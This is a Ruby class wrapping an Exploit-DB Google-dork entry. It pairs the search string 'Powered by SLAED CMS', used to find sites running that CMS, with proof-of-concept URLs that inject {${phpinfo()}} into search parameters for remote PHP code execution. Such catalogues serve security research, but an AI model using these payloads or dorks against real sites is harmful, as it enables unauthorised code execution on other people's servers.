module Dorks
   class Dork3740 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3740",
            ghdb_url: "https://www.exploit-db.com/ghdb/3740",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2011-09-12",
            author: "anonymous",
            dork: <<~EDORK,
"Powered by SLAED CMS"
EDORK
            description: <<~EDESC
Exploit Title: Slaed CMS Code exec On different versions of this software next vulnerabilities are availible: /index.php?name=Search&mod=&word={${phpinfo()}}&query=ok&to=view /index.php?name=Search&mod=&word=ok&query={${phpinfo()}}&to=view OR: /search.html?mod=&word={${phpinfo()}}&query=ok&to=view /search.html?mod=&word=ok&query={${phpinfo()}}&to=view
EDESC
         })

      end
   end
end
